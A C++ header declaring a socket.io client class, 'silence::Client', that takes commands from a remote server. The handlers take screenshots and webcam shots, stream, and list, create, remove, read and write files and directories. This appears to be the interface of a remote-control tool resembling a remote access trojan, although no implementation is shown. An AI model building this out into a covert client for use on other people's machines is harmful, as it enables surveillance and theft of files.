#pragma once

#include <functional>
#include <utility>
#include <future>

#include <sio_client.h>
#include <sio_message.h>
#include <sio_socket.h>

#include <core/Util.h>

namespace silence
{
    class Client
    {
    public:
        using CommandObject = std::map<std::string, sio::message::ptr>;

        Client(const std::string &url);
        ~Client();

        void connect();

    private:
        void onConnected(const std::string &nsp);

        void onFailed();

        void onClosed(sio::client::close_reason const &reason);

    private:
        sio::message::list
        createObject(const CommandObject &object);

        template <typename T, typename... Args>
        void launchEvent(const std::function<T> &callable,
                         Args &&...args);

    private:
        void onCommand(std::string const &name,
                       sio::message::ptr const &data,
                       bool hasAck,
                       sio::message::list &ack_resp);

    private:
        void greetEvent();                                // starts the client
        void screenshotEvent();                           // takes a screenshot
        void webcamShotEvent();                           // takes a webcam shot
        void killStreamEvent();                           // kills a stream
        void startStreamEvent();                          // creates a strean
        void listDirEvent(const CommandObject &object);   // lists a directory
        void mkDirEvent(const CommandObject &object);     // creates a directory
        void removeDirEvent(const CommandObject &object); // removes a directory
        void writeFileEvent(const CommandObject &object); // writes a file
        void readFileEvent(const CommandObject &object);  // reads a file

        void error(const std::string &event, const std::string &msg);
        void info(const std::string &info);

    private:
        std::string mUrl;
        std::unique_ptr<sio::client> mIO;
        std::mutex mLock;
        std::mutex mStreamLocker;

        std::condition_variable_any mCond;
        bool mStreamRunning{false};

        sio::socket::ptr mSocket;
    };
}